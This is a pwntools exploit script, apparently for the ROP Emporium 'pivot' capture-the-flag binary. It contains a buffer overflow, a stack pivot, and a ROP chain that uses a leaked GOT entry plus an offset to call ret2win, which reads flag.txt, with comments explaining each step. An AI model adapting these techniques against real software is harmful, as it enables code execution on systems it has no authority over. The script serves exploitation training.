from pwn import * 

"""
0x00000970    1 24           sym.foothold_function


[0x00000870]>  pdf @sym.ret2win
/ (fcn) sym.ret2win 26
|   sym.ret2win ();
|           0x00000abe      55             push rbp
|           0x00000abf      4889e5         mov rbp, rsp
|           0x00000ac2      488d3d880000.  lea rdi, str.bin_cat_flag.txt ; 0xb51 ; "/bin/cat flag.txt" ; const char *string
|           0x00000ac9      e862fdffff     call sym.imp.system         ; int system(const char *string)
|           0x00000ace      bf00000000     mov edi, 0                  ; int status
\\           0x00000ad3      e878fdffff     call sym.imp.exit           ; void exit(int status)
[0x00000870]> 

0x00000abe - 0x00000970 = 14e

"""

"""
beofre rax = 0x602048

0x602048:       0xd12c6970      0x00007f62      0xd0f80130      0x00007f62

after rax = 0x7f62d12c6970
"""

def stage2():

	chain = p64(0x400850)  # foothold_function@plt [call this to update the GOT]
	chain += p64(0x400b00) # pop rax ; ret 
	chain += p64(0x602048) # foothold_function@got [rax = foothold_function@got] [this is the function inside the GOT inside the binary but by referencing this address we will get the loaded got that is running inside the binary. This is very similar to leaking a GOT entry to bypass ASLR.]
	chain += p64(0x400b05) # mov rax, qword ptr [rax] ; [rax = go to rax and treat value in rax as an address and go there and get the 8 byte address(address of foothold_function inside the loaded GOT)]
	chain += p64(0x400900) #  pop rbp ; ret
	chain += p64(0x14e) # [rbp = 14e] [use this to offset the foothold_function@got to go to the ret2win function]
	chain += p64(0x400b09) # add rax, rbp ; ret [rax = rax+14e]
	chain += p64(0x40098e) # call rax (ret2win)

	return chain

def stage1(pivot_address):

	pwn = "A" * 40 # overflow
	pwn += p64(0x400b00) # pop rax ; ret
	pwn += p64(pivot_address) # [rax = pivot_address] [this address is where the top of our stage 2 rop chain sits]
	pwn += p64(0x400b02) # xchg rax, rsp ; ret [rsp = rax (stack pivot)] [after the ret, 8 bytes are popped into rip from rsp and the next part of the chain is executed]

	return pwn

def exploit():

	p = process('./pivot')
	#p = gdb.debug('./pivot', 'b *0x400b00')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("Sending Exploit")

	leaked_address = int(p.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1], 16)
	log.success(hex(leaked_address)) # address that holds foothold_function@plt

	p.recvuntil("Send your second chain now and it will land there")
	p.sendline(stage2())
	p.recvuntil(">")
	p.sendline(stage1(leaked_address))
	p.interactive()

exploit()